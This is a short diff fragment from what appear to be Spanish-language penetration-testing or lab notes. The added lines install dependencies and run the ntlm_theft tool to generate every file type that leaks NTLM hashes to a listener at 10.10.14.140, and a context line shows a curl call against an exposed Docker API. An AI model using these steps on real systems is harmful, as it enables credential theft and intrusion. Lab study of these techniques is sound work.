@@ -4814,6 +4814,13 @@ curl -X POST http://192.168.65.7:2375/exec/<EXECID>/start \
 Si pero existe una herramienta que genera todos los archivos que pueden regresar un hash ntlm.
 
 ```
+uv venv
+source .venv/bin/activate
+uv pip install xlsxwriter
+
+uv run python ntlm_theft.py -g all -s 10.10.14.140 -f test
+
+
 
 ```
 
